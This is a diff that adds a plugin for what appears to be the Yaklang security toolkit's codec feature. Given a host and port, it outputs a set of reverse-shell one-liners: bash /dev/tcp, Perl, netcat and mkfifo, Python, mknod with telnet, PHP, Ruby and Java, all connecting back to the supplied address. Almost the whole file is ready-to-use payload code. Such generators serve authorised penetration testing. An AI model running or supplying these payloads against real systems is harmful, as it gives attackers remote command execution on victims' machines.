@@ -1,0 +1,58 @@
+# codec plugin
+
+/*
+Codec Plugin 可以支持在 Codec 中自定义编码解码，自定义 Bypass 与字符串处理函数
+
+函数定义非常简单
+
+func(i: string) string
+*/
+
+handle = func(origin /*string*/) {
+    host, port, _ = str.ParseStringToHostPort(origin)
+    if port <= 0 {
+        port = 4444
+    }
+    if host == "" {
+        host = origin
+    }
+    
+    # handle your origin str
+    lines = make([]string)
+    add = func(s) {
+        lines = append(lines, s)
+    }
+    add("# Bash Linux")
+    add(sprintf(`bash -i >& /dev/tcp/%v/%v 0>&1`, host, port))
+    add("")
+
+    add("# Perl")
+    add(sprintf(`perl -e 'use Socket;$i="%v";$p=%v;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, host, port))
+    add(sprintf(`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%v:%v");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, host, port))
+    add("")
+    
+    add("# NC")
+    add(sprintf(`nc -e /bin/sh %v %v`, host, port))
+    add(sprintf(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %v %v >/tmp/f`, host, port))
+
+    add("# Python -C")
+    add(sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%v",%v));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, host, port))
+    add(sprintf(`python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('%v',%v))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"`, host, port))
+    add("")
+
+    add("# mknod")
+    add(sprintf(`mknod backpipe p && telnet %v %v 0<backpipe | /bin/bash 1>backpipe`, host, port))
+    add("")
+
+    add("# PHP")
+    add(sprintf(`php -r '$sock=fsockopen("%v",%v);exec("/bin/sh -i <&3 >&3 2>&3");'`, host, port))
+    add("")
+
+    add(sprintf(`ruby -rsocket -e'f=TCPSocket.open("%v",%v).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, host, port))
+    add(sprintf(`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("%v","%v");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, host, port))
+    add(sprintf(`ruby -rsocket -e 'c=TCPSocket.new("%v","%v");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, host, port))
+    add("")
+
+    add(sprintf(`r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%v/%v;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()`, host, port))
+    return str.Join(lines, "\n")
+}
